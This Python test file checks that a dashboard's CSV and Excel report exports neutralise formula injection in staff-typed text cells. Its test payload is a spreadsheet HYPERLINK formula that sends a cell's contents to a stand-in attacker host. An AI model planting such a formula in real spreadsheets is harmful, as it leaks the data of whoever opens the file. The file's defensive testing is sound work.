"""Report downloads must not carry a live formula into the landlord's spreadsheet.

Descriptions, names and building labels in a report are typed in by staff. In
CSV the cell gets an apostrophe; in Excel it is stored as a string, which keeps
the value exactly as typed. Money stays a number in both.
"""
import csv
import io
from decimal import Decimal

from openpyxl import load_workbook

from apps.dashboard.exports import Column, Sheet, to_csv, to_xlsx

PAYLOAD = '=HYPERLINK("https://attacker.example/?d="&A1,"Receipt")'


def _sheet():
    return Sheet(
        title="Expenses",
        columns=[Column("desc", "Description"), Column("amount", "Amount", kind="money")],
        rows=[{"desc": PAYLOAD, "amount": Decimal("-250.00")}, {"desc": "Water", "amount": "100"}],
        subtitle=["=1+1"],
        notes=["@note"],
    )


def test_csv_text_cells_are_neutralised():
    rows = list(csv.reader(io.StringIO(to_csv(_sheet()).decode("utf-8-sig"))))
    cells = [c for row in rows for c in row]
    assert "'" + PAYLOAD in cells
    assert "'=1+1" in cells
    assert "'@note" in cells
    assert not any(c.startswith(("=", "@")) for c in cells)


def test_csv_money_is_left_a_number():
    rows = list(csv.reader(io.StringIO(to_csv(_sheet()).decode("utf-8-sig"))))
    assert ["'" + PAYLOAD, "-250.00"] in rows
    assert ["Water", "100.00"] in rows


def test_xlsx_never_stores_a_formula():
    ws = load_workbook(io.BytesIO(to_xlsx(_sheet()))).active
    cells = [c for row in ws.iter_rows() for c in row if c.value is not None]
    assert not [c.coordinate for c in cells if c.data_type == "f"]
    assert PAYLOAD in [c.value for c in cells]
    assert -250.0 in [c.value for c in cells]
